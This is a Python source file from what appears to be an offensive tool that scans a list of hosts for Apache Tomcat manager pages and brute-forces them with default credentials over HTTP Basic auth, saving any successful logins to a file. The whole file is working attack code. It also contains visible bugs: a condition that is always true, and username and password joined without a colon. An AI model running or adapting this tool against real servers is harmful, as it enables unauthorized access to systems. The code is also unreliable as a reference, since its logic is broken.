from requests import get
from rich import print
from base64 import b64encode

from urllib3 import disable_warnings
disable_warnings()

from src.core.manager import *


def connect(args) -> str:
    """ Check if target is alive and try to connect with Apache Tomcat login page """

    targets_file = args.l
    
    with open(targets_file, "r+") as file:

        content = file.readlines()

        for target in content:

            if target == None:
                return

            target = target.rstrip()
            url: str = f"{target}/manager/html"

            try:
                response = get(url, **props)
                body: str = response.text
                status_code: str = response.status_code

                if status_code == 401 or 200 and 'Tomcat' or 'tomcat' in body:
                    bruteforce(url)
                else:
                    print(f"[red][-] Connection problems with {target} | {status_code} [/]")

            except Exception as e:
                return print(f"[red][!] An error happened: {e} [/]")

            except ConnectionRefusedError:
                pass


def bruteforce(url) -> str:
    """ Bruteforce Apache Tomcat login with default credentials """

    print(f"[bold yellow][*] Starting bruteforce on [bold white]{url}[/][/]")
    print(f"[bold yellow][*] {len(get_usernames())} Usernames loaded. {len(get_passwords())} Passwords loaded.[/]")

    for u, p in zip(get_usernames(), get_passwords()):

        auth_string: str = u+p
        auth_string: str = auth_string.encode('utf-8')
        auth_string: str = b64encode(auth_string)
        auth_string: str = f'Basic {auth_string}'

        chars: str = "b'"
        auth_string: str = auth_string.replace(chars, "")
        auth_string: str = auth_string.replace("'", "")

        auth_header: str = { 'Authorization': auth_string, 'User-Agent': user_agent() }

        response = get(url, verify=False, headers=auth_header)
        status_code: str = response.status_code

        if (status_code == 200):
            print(f"[green][+] Credentials ~ {u+p} | Cookie: {auth_string}\n[/]")

            with open("src/core/result/out.txt", "a+") as file:
                file.write(f"{url} | {u+p} | {auth_string}")

    print(f"[bold white][*] Bruteforce in {url} is done.\n[/]")